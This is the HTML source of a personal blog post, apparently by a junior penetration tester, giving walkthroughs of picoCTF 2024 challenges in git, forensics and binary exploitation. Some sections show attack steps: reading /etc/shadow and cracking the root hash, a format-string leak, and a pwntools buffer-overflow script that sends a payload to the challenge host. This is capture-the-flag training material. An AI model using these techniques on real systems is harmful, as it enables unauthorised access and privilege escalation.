@@ -1,0 +1,188 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>picoCTF 2024 | Foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>picoCTF 2024</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-03-16T00:16:50.000Z" id="date"> 2024-03-16</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-03-16T04:16:00.203Z" id="updated"> 2024-03-16</time></div></span></div></div><hr><div id="post-content"><h1 id="General"><a href="#General" class="headerlink" title="General"></a>General</h1><h2 id="Super-SSH"><a href="#Super-SSH" class="headerlink" title="Super SSH"></a>Super SSH</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/General.png'><img src="/picoCTF/picoCTF2024/General.png" alt="General"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh ctf-player@titan.picoctf.net -p 63095<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General1.png'><img src="/picoCTF/picoCTF2024/General1.png" alt="General"></p>
+<h2 id="Commitment-Issues"><a href="#Commitment-Issues" class="headerlink" title="Commitment Issues"></a>Commitment Issues</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/General2.png'><img src="/picoCTF/picoCTF2024/General2.png" alt="General"></p>
+<p>After unzipping, we have a  message.txt file with the following message</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General3.png'><img src="/picoCTF/picoCTF2024/General3.png" alt="General"></p>
+<p>We can run git log to see older commits</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General4.png'><img src="/picoCTF/picoCTF2024/General4.png" alt="General"></p>
+<p>From this we know that the flag was created in the previous commit</p>
+<p>We can change to that commit</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git checkout 87b85d7dfb839b077678611280fa023d76e017b8<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General5.png'><img src="/picoCTF/picoCTF2024/General5.png" alt="General"></p>
+<p>We can now see the flag inside message.txt</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General6.png'><img src="/picoCTF/picoCTF2024/General6.png" alt="General"></p>
+<h2 id="Time-Machine"><a href="#Time-Machine" class="headerlink" title="Time Machine"></a>Time Machine</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/General7.png'><img src="/picoCTF/picoCTF2024/General7.png" alt="General"></p>
+<p>After unzipping and reading message.txt</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General8.png'><img src="/picoCTF/picoCTF2024/General8.png" alt="General"></p>
+<p>The flag is in the git log</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General9.png'><img src="/picoCTF/picoCTF2024/General9.png" alt="General"></p>
+<h2 id="Blame-Game"><a href="#Blame-Game" class="headerlink" title="Blame Game"></a>Blame Game</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/General10.png'><img src="/picoCTF/picoCTF2024/General10.png" alt="General"></p>
+<p>The content of <a target="_blank" rel="noopener" href="http://message.py/">message.py</a> is an unfinished command</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General11.png'><img src="/picoCTF/picoCTF2024/General11.png" alt="General"></p>
+<p>If we run git log, we can see a huge list of commits</p>
+<p>Send the output of the git log command to a .txt file</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">log</span> &gt; output.txt<br></code></pre></td></tr></table></figure>
+
+<p>If we cat the output now, we can see the flag in the author name of one of the earliest commits</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General12.png'><img src="/picoCTF/picoCTF2024/General12.png" alt="General"></p>
+<h2 id="Collaborative-Development"><a href="#Collaborative-Development" class="headerlink" title="Collaborative Development"></a>Collaborative Development</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/General13.png'><img src="/picoCTF/picoCTF2024/General13.png" alt="General"></p>
+<p><a target="_blank" rel="noopener" href="http://flag.py/">flag.py</a> content</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General14.png'><img src="/picoCTF/picoCTF2024/General14.png" alt="General"></p>
+<p>If we list all branches, we can see different branches, related to different parts</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git branch -a<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General15.png'><img src="/picoCTF/picoCTF2024/General15.png" alt="General"></p>
+<p>We can use git diff to see all the differences in the branches, and each part has a part of the flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git diff feature/part-1 feature/part-2 feature/part-3<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General16.png'><img src="/picoCTF/picoCTF2024/General16.png" alt="General"></p>
+<h2 id="binhexa"><a href="#binhexa" class="headerlink" title="binhexa"></a>binhexa</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/General17.png'><img src="/picoCTF/picoCTF2024/General17.png" alt="General"></p>
+<p>In this challenge we need to answer a bunch of questions related to binary operations, the numbers are random every time<br>I used this <a target="_blank" rel="noopener" href="https://www.rapidtables.com/calc/math/binary-calculator.html">binary calculator</a></p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General18.png'><img src="/picoCTF/picoCTF2024/General18.png" alt="General"></p>
+<h2 id="Binary-Search"><a href="#Binary-Search" class="headerlink" title="Binary Search"></a>Binary Search</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/General19.png'><img src="/picoCTF/picoCTF2024/General19.png" alt="General"></p>
+<p>In this challenge, the best strategy is to keep finding the median in between guesses</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General20.png'><img src="/picoCTF/picoCTF2024/General20.png" alt="General"></p>
+<h2 id="endianness"><a href="#endianness" class="headerlink" title="endianness"></a>endianness</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/General21.png'><img src="/picoCTF/picoCTF2024/General21.png" alt="General"></p>
+<p>For this challenge I used a python script to convert ASCII to little and big endian, just change the input_string </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ascii_to_little_endian</span>(<span class="hljs-params">input_string</span>):<br>    <span class="hljs-comment"># Convert the input string to ASCII bytes</span><br>    ascii_bytes = input_string.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Convert ASCII bytes to little endian hexadecimal representation</span><br>    little_endian_hex = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">format</span>(byte, <span class="hljs-string">&#x27;02x&#x27;</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(ascii_bytes))<br>    <br>    <span class="hljs-keyword">return</span> little_endian_hex<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ascii_to_big_endian</span>(<span class="hljs-params">input_string</span>):<br>    <span class="hljs-comment"># Convert the input string to ASCII bytes</span><br>    ascii_bytes = input_string.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <br>    <span class="hljs-comment"># Convert ASCII bytes to big endian hexadecimal representation</span><br>    big_endian_hex = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">format</span>(byte, <span class="hljs-string">&#x27;02x&#x27;</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ascii_bytes)<br>    <br>    <span class="hljs-keyword">return</span> big_endian_hex<br><br><span class="hljs-comment"># Example usage for little endian:</span><br>input_string = <span class="hljs-string">&quot;lopmo&quot;</span><br>little_endian_hex = ascii_to_little_endian(input_string)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Little Endian Hexadecimal Representation:&quot;</span>, little_endian_hex)<br><br><span class="hljs-comment"># Example usage for big endian:</span><br>big_endian_hex = ascii_to_big_endian(input_string)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Big Endian Hexadecimal Representation:&quot;</span>, big_endian_hex)<br><br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General22.png'><img src="/picoCTF/picoCTF2024/General22.png" alt="General"></p>
+<h2 id="dont-you-love-banners"><a href="#dont-you-love-banners" class="headerlink" title="dont-you-love-banners"></a>dont-you-love-banners</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/General23.png'><img src="/picoCTF/picoCTF2024/General23.png" alt="General"></p>
+<p>We can use nc to see what information is leaking, and we can see a password</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General24.png'><img src="/picoCTF/picoCTF2024/General24.png" alt="General"></p>
+<p>We can use this password to connect to the application</p>
+<p>The other two questions are easily googled</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General25.png'><img src="/picoCTF/picoCTF2024/General25.png" alt="General"></p>
+<p>We are now in a shell as the user player, and in it’s home directory we have a text file</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General27.png'><img src="/picoCTF/picoCTF2024/General27.png" alt="General"></p>
+<p>We have access to the &#x2F;root directory, but no permission to read flag.txt</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General28.png'><img src="/picoCTF/picoCTF2024/General28.png" alt="General"></p>
+<p>However we have access to the &#x2F;etc&#x2F;shadow file</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General29.png'><img src="/picoCTF/picoCTF2024/General29.png" alt="General"></p>
+<p>We can crack the root’s hash</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General30.png'><img src="/picoCTF/picoCTF2024/General30.png" alt="General"></p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General31.png'><img src="/picoCTF/picoCTF2024/General31.png" alt="General"></p>
+<p>Now just change user to root and cat the flag.txt</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/General32.png'><img src="/picoCTF/picoCTF2024/General32.png" alt="General"></p>
+<h1 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h1><h2 id="format-string-0"><a href="#format-string-0" class="headerlink" title="format string 0"></a>format string 0</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/Binary.png'><img src="/picoCTF/picoCTF2024/Binary.png" alt="Binary"></p>
+<p>This one is very simple, we can spam the %p parameter</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary1.png'><img src="/picoCTF/picoCTF2024/Binary1.png" alt="Binary"></p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary2.png'><img src="/picoCTF/picoCTF2024/Binary2.png" alt="Binary"></p>
+<h2 id="heap-0"><a href="#heap-0" class="headerlink" title="heap 0"></a>heap 0</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/Binary3.png'><img src="/picoCTF/picoCTF2024/Binary3.png" alt="Binary"></p>
+<p>For this challenge, in the source code, the check_win function just compares the safe_var variable to the string “bico”, if the safe_var variable is not equal to “bico” the code runs.<br>So we just need to overflow the stack until the safe_var variable is not equal to “bico”</p>
+<p>We can just spam A’s and safe_var will be overwritten</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary4.png'><img src="/picoCTF/picoCTF2024/Binary4.png" alt="Binary"></p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary5.png'><img src="/picoCTF/picoCTF2024/Binary5.png" alt="Binary"></p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary6.png'><img src="/picoCTF/picoCTF2024/Binary6.png" alt="Binary"></p>
+<h2 id="heap-1"><a href="#heap-1" class="headerlink" title="heap 1"></a>heap 1</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/Binary7.png'><img src="/picoCTF/picoCTF2024/Binary7.png" alt="Binary"></p>
+<p>Looking at the source code, this is very similar to the previous challenge, however, this time the check_win() function will only run if safe_var is equal to “pico”</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary8.png'><img src="/picoCTF/picoCTF2024/Binary8.png" alt="Binary"></p>
+<p>To find the point in which the safe_var starts being overwritten, I created a 50 character pattern</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary9.png'><img src="/picoCTF/picoCTF2024/Binary9.png" alt="Binary"></p>
+<p>With this pattern, we can see that safe_var starts being overwritten in 0Ab1</p>
+<p>So we just need to replace 0Ab1Ab2Ab3Ab4Ab5Ab with “pico”</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary10.png'><img src="/picoCTF/picoCTF2024/Binary10.png" alt="Binary"></p>
+<p>Now just use option 4 to print the flag</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary11.png'><img src="/picoCTF/picoCTF2024/Binary11.png" alt="Binary"></p>
+<h2 id="heap-2"><a href="#heap-2" class="headerlink" title="heap 2"></a>heap 2</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/Binary12.png'><img src="/picoCTF/picoCTF2024/Binary12.png" alt="Binary"></p>
+<p>This time the function check_win() dereferences a pointer (x), assumes that the value stored at that memory address is the address of a function</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary13.png'><img src="/picoCTF/picoCTF2024/Binary13.png" alt="Binary"></p>
+<p>So we first need to find where x starts being overwritten, and then write the address of the win() function</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary14.png'><img src="/picoCTF/picoCTF2024/Binary14.png" alt="Binary"></p>
+<p>Find where x starts being overwritten</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary15.png'><img src="/picoCTF/picoCTF2024/Binary15.png" alt="Binary"></p>
+<p>x starts being overwritten after 32 chars</p>
+<p>Then I used pwndbg to find the win() function address</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary16.png'><img src="/picoCTF/picoCTF2024/Binary16.png" alt="Binary"></p>
+<p>The memory address for the win() function is 0x4011a0</p>
+<p>Then I made a python script to send 32 chars, and then the memory address for the win() function</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># Connect to the remote host and port</span><br>host = <span class="hljs-string">&#x27;mimas.picoctf.net&#x27;</span><br>port = <span class="hljs-number">61553</span><br>p = remote(host, port)<br><br><span class="hljs-comment"># Pause to allow time for the binary to start up</span><br>pause()<br><br><span class="hljs-comment"># Select option 2 to write to the buffer</span><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br><span class="hljs-comment"># Send the payload to trigger buffer overflow</span><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">32</span> + <span class="hljs-string">b&quot;\xa0\x11\x40&quot;</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># Select option 4 to print the flag</span><br>p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-comment"># Receive and print the flag</span><br><span class="hljs-built_in">print</span>(p.recvuntil(<span class="hljs-string">&#x27;&#125;&#x27;</span>).decode())<br><br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Binary17.png'><img src="/picoCTF/picoCTF2024/Binary17.png" alt="Binary"></p>
+<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Scan-Surprise"><a href="#Scan-Surprise" class="headerlink" title="Scan Surprise"></a>Scan Surprise</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics.png'><img src="/picoCTF/picoCTF2024/Forensics.png" alt="Forensics"></p>
+<p>After unzipping, we have a flag.png file that contains a QR code</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics1.png'><img src="/picoCTF/picoCTF2024/Forensics1.png" alt="Forensics"></p>
+<p>We just need to scan it for the flag</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics2.png'><img src="/picoCTF/picoCTF2024/Forensics2.png" alt="Forensics"></p>
+<h2 id="Verify"><a href="#Verify" class="headerlink" title="Verify"></a>Verify</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics3.png'><img src="/picoCTF/picoCTF2024/Forensics3.png" alt="Forensics"></p>
+<p>In this challenge, ssh into the machine and cat checksum.txt</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics4.png'><img src="/picoCTF/picoCTF2024/Forensics4.png" alt="Forensics"></p>
+<p>This is the sha256 checksum of the file we need to find</p>
+<p>In the files directory we have a huge list of files</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics5.png'><img src="/picoCTF/picoCTF2024/Forensics5.png" alt="Forensics"></p>
+<p>We just need to check the sha256 hash of all the files, and grep the one we want from the checksum.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sha256sum</span> * | grep <span class="hljs-string">&quot;fba9f49bf22aa7188a155768ab0dfdc1f9b86c47976cd0f7c9003af2e20598f7&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics6.png'><img src="/picoCTF/picoCTF2024/Forensics6.png" alt="Forensics"></p>
+<p>We now just run the <a target="_blank" rel="noopener" href="http://decrypt.sh/">decrypt.sh</a> with this file</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics7.png'><img src="/picoCTF/picoCTF2024/Forensics7.png" alt="Forensics"></p>
+<h2 id="CanYouSee"><a href="#CanYouSee" class="headerlink" title="CanYouSee"></a>CanYouSee</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics8.png'><img src="/picoCTF/picoCTF2024/Forensics8.png" alt="Forensics"></p>
+<p>For this challenge, we just have a .jpg file</p>
+<p>The image gives us nothing</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics9.png'><img src="/picoCTF/picoCTF2024/Forensics9.png" alt="Forensics"></p>
+<p>I went to look for the magic bytes by using head, and ended up finding a base64 encoded string</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ukn_reality.jpg | <span class="hljs-built_in">head</span><br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics10.png'><img src="/picoCTF/picoCTF2024/Forensics10.png" alt="Forensics"></p>
+<p>We can just decode this</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics11.png'><img src="/picoCTF/picoCTF2024/Forensics11.png" alt="Forensics"></p>
+<h2 id="Secret-of-the-Polyglot"><a href="#Secret-of-the-Polyglot" class="headerlink" title="Secret of the Polyglot"></a>Secret of the Polyglot</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics12.png'><img src="/picoCTF/picoCTF2024/Forensics12.png" alt="Forensics"></p>
+<p>In this challenge, we have a pdf file, and if we open it, we can see the second half of the flag</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics13.png'><img src="/picoCTF/picoCTF2024/Forensics13.png" alt="Forensics"></p>
+<p>If we look at the file’s magic bytes,  we will find the PNG magic bytes</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics14.png'><img src="/picoCTF/picoCTF2024/Forensics14.png" alt="Forensics"></p>
+<p>Just change the extension to .png and open it</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics15.png'><img src="/picoCTF/picoCTF2024/Forensics15.png" alt="Forensics"></p>
+<p>We now have the first half of the flag too</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics16.png'><img src="/picoCTF/picoCTF2024/Forensics16.png" alt="Forensics"></p>
+<h2 id="Mob-psycho"><a href="#Mob-psycho" class="headerlink" title="Mob psycho"></a>Mob psycho</h2><p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics17.png'><img src="/picoCTF/picoCTF2024/Forensics17.png" alt="Forensics"></p>
+<p>This challenge gives us an apk file<br>We can unzip apk files, after unzipping we are left with a lot of files to search through</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics18.png'><img src="/picoCTF/picoCTF2024/Forensics18.png" alt="Forensics"></p>
+<p>I ended up finding a flag.txt file</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*flag*&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics19.png'><img src="/picoCTF/picoCTF2024/Forensics19.png" alt="Forensics"></p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics20.png'><img src="/picoCTF/picoCTF2024/Forensics20.png" alt="Forensics"></p>
+<p>Convert from hex and we get the flag</p>
+<p class='item-img' data-src='/picoCTF/picoCTF2024/Forensics21.png'><img src="/picoCTF/picoCTF2024/Forensics21.png" alt="Forensics"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Mirai/">[HTB] Mirai Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'Foguh' Ferreira</a></h1><div id="description"><p>Junior PenTester</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#General"><span class="toc-number">1.</span> <span class="toc-text">General</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Super-SSH"><span class="toc-number">1.1.</span> <span class="toc-text">Super SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commitment-Issues"><span class="toc-number">1.2.</span> <span class="toc-text">Commitment Issues</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Time-Machine"><span class="toc-number">1.3.</span> <span class="toc-text">Time Machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blame-Game"><span class="toc-number">1.4.</span> <span class="toc-text">Blame Game</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Collaborative-Development"><span class="toc-number">1.5.</span> <span class="toc-text">Collaborative Development</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#binhexa"><span class="toc-number">1.6.</span> <span class="toc-text">binhexa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Binary-Search"><span class="toc-number">1.7.</span> <span class="toc-text">Binary Search</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#endianness"><span class="toc-number">1.8.</span> <span class="toc-text">endianness</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dont-you-love-banners"><span class="toc-number">1.9.</span> <span class="toc-text">dont-you-love-banners</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Binary-Exploitation"><span class="toc-number">2.</span> <span class="toc-text">Binary Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#format-string-0"><span class="toc-number">2.1.</span> <span class="toc-text">format string 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heap-0"><span class="toc-number">2.2.</span> <span class="toc-text">heap 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heap-1"><span class="toc-number">2.3.</span> <span class="toc-text">heap 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heap-2"><span class="toc-number">2.4.</span> <span class="toc-text">heap 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">3.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scan-Surprise"><span class="toc-number">3.1.</span> <span class="toc-text">Scan Surprise</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Verify"><span class="toc-number">3.2.</span> <span class="toc-text">Verify</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CanYouSee"><span class="toc-number">3.3.</span> <span class="toc-text">CanYouSee</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Secret-of-the-Polyglot"><span class="toc-number">3.4.</span> <span class="toc-text">Secret of the Polyglot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mob-psycho"><span class="toc-number">3.5.</span> <span class="toc-text">Mob psycho</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
